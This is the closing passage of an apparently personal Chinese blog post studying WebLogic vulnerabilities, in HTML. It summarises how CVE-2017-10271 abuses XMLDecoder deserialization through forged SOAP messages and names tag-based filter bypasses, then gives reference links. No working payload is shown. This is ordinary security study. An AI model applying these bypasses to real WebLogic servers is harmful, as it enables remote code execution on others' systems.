+<h3 id="小结-1" class="heading-element"><span>小结</span>
+  <a href="#%e5%b0%8f%e7%bb%93-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>原理也说过，就是通过伪造的 SOAP 报文，把恶意的 XML 数据发送到服务器端，由服务器的 XMLDecoder 解析并实例化对象（反序列化），从而触发任意代码执行。用于处理 SOAP 报文的那几个路由都能打，后续绕过的话就是翻 XMLDecoder 官方文档找黑名单外的标签，比如过滤了 object ，就要 void 、new 来绕过，都禁用了，用 class 来动态加载类，最后还可以 <code>&lt;array method=&quot;forName&quot;&gt;</code> 来绕过 class，但所需的 jdk 版本太低了，感觉越到后面越没啥用</p>
+<h3 id="参考-1" class="heading-element"><span>参考</span>
+  <a href="#%e5%8f%82%e8%80%83-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/"target="_blank" rel="external nofollow noopener noreferrer">https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/</a></p>
+<p><a href="https://xz.aliyun.com/news/4656"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/4656</a></p>
+<p><a href="https://www.freebuf.com/vuls/206374.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/vuls/206374.html</a></p>
+<p><a href="https://xz.aliyun.com/news/4656"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/4656</a></p>
+<h2 id="总结" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>没什么好说的，感觉利用面比较窄，也没打过啥实战，也不清楚其实</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2025-05-11 14:18:27">更新于 2025-05-11&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/705d533/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://localhost:1313/posts/705d533/" data-title="Weblogic学习(1)" data-hashtags="Java"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/705d533/" data-hashtag="Java"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://localhost:1313/posts/705d533/" data-title="Weblogic学习(1)" data-web><i class="fa-brands fa-whatsapp fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://localhost:1313/posts/705d533/" data-title="Weblogic学习(1)"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/705d533/" data-title="Weblogic学习(1)"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://localhost:1313/posts/705d533/" data-title="Weblogic学习(1)" data-description=""><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Myspace</title><path d="M19.802 12.274A3.811 3.811.0 0023.62 8.47c0-2.101-1.71-3.795-3.818-3.795a3.816 3.816.0 00-3.818 3.81 3.817 3.817.0 003.818 3.811zm-8.602.705a3.43 3.43.0 003.435-3.424A3.43 3.43.0 0011.2 6.13 3.44 3.44.0 007.764 9.566 3.436 3.436.0 0011.2 13zm-7.8.635c1.71.0 3.093-1.38 3.093-3.081.0-1.704-1.395-3.084-3.105-3.084A3.086 3.086.0 00.3 10.539c0 1.7 1.387 3.078 3.095 3.078zm0 .705c-1.96.0-3.4 1.717-3.4 3.495v1.196c0 .17.138.31.31.31h6.18a.31.31.0 00.309-.31v-1.196c0-1.779-1.437-3.5-3.398-3.5zm7.8-.56c-2.18.0-3.78 1.915-3.78 3.891v1.331c0 .188.156.344.345.344h6.87a.344.344.0 00.342-.344V17.65c0-1.976-1.598-3.891-3.777-3.891zm8.602-.617c-2.422.0-4.197 2.126-4.197 4.323v1.477c0 .21.172.381.382.381h7.63c.21.0.383-.171.383-.381v-1.477c-.001-2.197-1.776-4.323-4.198-4.323z"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://localhost:1313/posts/705d533/" data-title="Weblogic学习(1)" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://localhost:1313/posts/705d533/" data-title="Weblogic学习(1)"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/java/" class="post-tag" title="标签 - Java">Java</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/0846c48/" class="post-nav-item" rel="prev" title="Weblogic学习(2)"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Weblogic学习(2)</a><a href="/posts/816babd/" class="post-nav-item" rel="next" title="SpringAOP链学习">SpringAOP链学习<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.17-30a67c4b"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">6s6</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.17-30a67c4b"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
